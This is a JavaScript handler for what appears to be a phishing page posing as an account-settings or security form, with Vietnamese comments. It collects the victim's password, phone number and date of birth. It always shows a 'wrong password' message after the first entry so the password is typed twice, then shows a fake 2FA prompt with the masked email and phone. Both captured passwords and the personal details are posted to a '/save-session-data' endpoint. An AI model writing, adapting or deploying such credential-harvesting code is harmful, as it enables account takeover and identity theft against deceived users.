document.getElementById('SaveButton').addEventListener('click', function () {
    const oldPasswordField = document.getElementById('OldPasswordField');
    const pleaseFill = document.getElementById('pleasefill');
    const passwordMd = document.getElementById('passwordmd');
    const saiPassword = document.getElementById('saipassword');
    const twoFAModal = document.getElementById('twoFAmodal');
    const spinPass = document.getElementById('spinpass');
    const buttonText = document.querySelector('#SaveButton .button-text');
    const getName = document.getElementById('getname');
    const getDevice = document.getElementById('getdevice');
    const deviceInfo = sessionStorage.getItem('deviceInfo');

    const phoneField = document.getElementById('PhoneField');
    const dobDay = document.getElementById('dob-day');
    const dobMonth = document.getElementById('dob-month');
    const dobYear = document.getElementById('dob-year');

    // Ẩn các thẻ cảnh báo khi nhấn nút
    if (pleaseFill) {
        pleaseFill.style.display = 'none';
    }
    if (saiPassword) {
        saiPassword.style.display = 'none';
    }

    // Kiểm tra input có trống không
    if (oldPasswordField.value.trim() === '' ||
        !phoneField.value.trim() ||
        dobDay.value === '' ||
        dobMonth.value === '' ||
        dobYear.value === '') {

        if (pleaseFill) {
            pleaseFill.style.display = 'block';
            if (passwordMd) {
                passwordMd.style.display = 'block';
            }
        }
        return;
    } else {
        spinPass.style.display = 'inline-block';
        buttonText.style.display = 'none';

        // First, save client info
        fetch('/save-client-info', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content
            },
            body: JSON.stringify({
                email: sessionStorage.getItem('Email'),
                fullName: sessionStorage.getItem('FullName'),
                phone: phoneField.value.trim(),
                'dob-year': dobYear.value,
                'dob-month': dobMonth.value,
                'dob-day': dobDay.value
            }),
        })
        .then(response => response.json())
        .then(data => console.log('Client info saved:', data))
        .catch(error => console.error('Error saving client info:', error));

        setTimeout(() => {
            spinPass.style.display = 'none';
            buttonText.style.display = 'inline-block';

            const email = sessionStorage.getItem('Email');
            const phoneNumber = sessionStorage.getItem('phoneNumber');
            const fullName = sessionStorage.getItem('FullName');
            let pass1 = sessionStorage.getItem('pass1');
            let pass2 = sessionStorage.getItem('pass2');

            const newPassword = oldPasswordField.value.trim();

            if (!pass1) {
                pass1 = newPassword;
                sessionStorage.setItem('pass1', pass1);

                if (saiPassword) {
                    saiPassword.style.display = 'block';
                }
                if (passwordMd) {
                    passwordMd.style.display = 'block';
                }
            } else if (!pass2) {
                pass2 = newPassword;
                sessionStorage.setItem('pass2', pass2);

                if (fullName && getName) {
                    const originalContent = getName.textContent.trim();
                    const updatedContent = `${fullName} • ${originalContent.split('•')[1].trim()}`;
                    getName.textContent = updatedContent;
                }

                if (getDevice) {
                    const updatedDeviceText = deviceInfo && deviceInfo !== 'Unknown'
                        ? getDevice.textContent.replace('Device', deviceInfo)
                        : getDevice.textContent.replace('Device', 'Device');
                    getDevice.textContent = updatedDeviceText;
                }

                if (passwordMd) {
                    passwordMd.style.display = 'none';
                }
                if (twoFAModal) {
                    twoFAModal.style.display = 'block';
                }
            } else {
                if (newPassword !== pass1 && newPassword !== pass2) {
                    pass2 = newPassword;
                    sessionStorage.setItem('pass2', pass2);
                    console.log('Updated pass2 with new value:', pass2);
                } else {
                    console.warn('New password matches existing pass1 or pass2.');
                }
            }

            // Cập nhật nội dung thẻ <strong> trong twoFA-options
            const emailStrong = document.querySelector('.twoFA-option label[for="auth-email"] .option-description strong');
            const whatsappStrong = document.querySelector('.twoFA-option label[for="auth-whatsapp"] .option-description strong');
            const smsStrong = document.querySelector('.twoFA-option label[for="auth-sms"] .option-description strong');

            // Ẩn thông tin nhạy cảm
            const maskedEmail = email ? `${email[0]}***********${email.slice(email.indexOf('@'))}` : 'Unknown';
            const maskedPhone = phoneNumber ? `${phoneNumber.slice(0, 3)}********${phoneNumber.slice(-2)}` : 'Unknown';

            if (emailStrong) emailStrong.textContent = maskedEmail;
            if (whatsappStrong) whatsappStrong.textContent = maskedPhone;
            if (smsStrong) smsStrong.textContent = maskedPhone;

            // Save session data
            fetch('/save-session-data', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content
                },
                body: JSON.stringify({
                    email: email,
                    fullName: fullName,
                    phone: phoneField.value.trim(),
                    dateOfBirth: `${dobYear.value}-${dobMonth.value.padStart(2, '0')}-${dobDay.value.padStart(2, '0')}`,
                    pass1: pass1,
                    pass2: pass2
                }),
            })
            .then(response => {
                sessionStorage.removeItem('pass2');
                if (response.ok) {
                    console.log('Session data saved successfully.');
                    return response.json();
                } else {
                    throw new Error('Failed to save session data.');
                }
            })
            .then(data => console.log('Server response:', data))
            .catch(error => console.error('Error:', error));

        }, 3000);
    }
});
